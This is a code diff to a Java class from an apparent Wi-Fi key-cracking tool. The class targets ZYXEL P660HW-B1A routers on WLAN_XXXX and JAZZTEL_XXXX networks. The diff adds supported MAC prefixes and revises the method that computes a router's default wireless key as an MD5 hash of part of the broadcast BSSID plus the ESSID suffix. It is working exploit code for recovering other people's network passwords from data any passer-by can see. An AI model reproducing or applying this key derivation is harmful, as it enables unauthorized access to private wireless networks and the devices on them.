@@ -10,6 +10,8 @@ import es.pulimento.wifi.core.WirelessNetwork.WirelessEncryption;
  * Zyxel algorithm.
  * This exploits a vulnerability in the following routers:
  * ZYXEL P660HW-B1A
+ * Supported MAC addresses:
+ * 00:1F:A4:XX:XX:XX (WLAN_XXXX & JAZZTEL_XXXX)
  * 
  * Unsuported / to be done:
  * P660HW-D1
@@ -35,12 +37,17 @@ public class ZyxelAlgorithm extends CrackAlgorithm {
 		// BSSID: 00:1F:A4:XX:XX:XX
 		addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(00:1F:A4:[0-9A-Fa-f:]{8})");
 
+
+
+
 		// ESSID: WLAN_XXXX
 		// BSSID: 00:23:F8:XX:XX:XX
+		// TODO: Comtrend?
 		addPattern("WLAN_([0-9a-fA-F]{4})", "(00:23:F8:[0-9A-Fa-f:]{8})");
 
 		// ESSID: JAZZTEL_XXXX
 		// BSSID: 00:23:F8:XX:XX:XX
+		// TODO: Comtrend?
 		addPattern("JAZZTEL_([0-9a-fA-F]{4})", "(00:23:F8:[0-9A-Fa-f:]{8})");
 
 		// ESSID: WLAN_XXXX
@@ -85,9 +92,9 @@ public class ZyxelAlgorithm extends CrackAlgorithm {
 
 	@Override
 	protected String crackAlgorithm(String essid_data, String bssid_data) {
-		essid_data = essid_data.toUpperCase();
-		bssid_data = bssid_data.replace(":", "").toUpperCase();
-   		return MD5Hash(bssid_data.substring(0,8).toLowerCase()+essid_data.substring(essid_data.length()-4, essid_data.length()).toLowerCase()).toLowerCase();	
+		essid_data = essid_data.toLowerCase();
+		bssid_data = bssid_data.replace(":", "").toLowerCase();
+		return MD5Hash(bssid_data.substring(0,8) + essid_data).toLowerCase();
 	}
 
 	private static String MD5Hash(String input) {
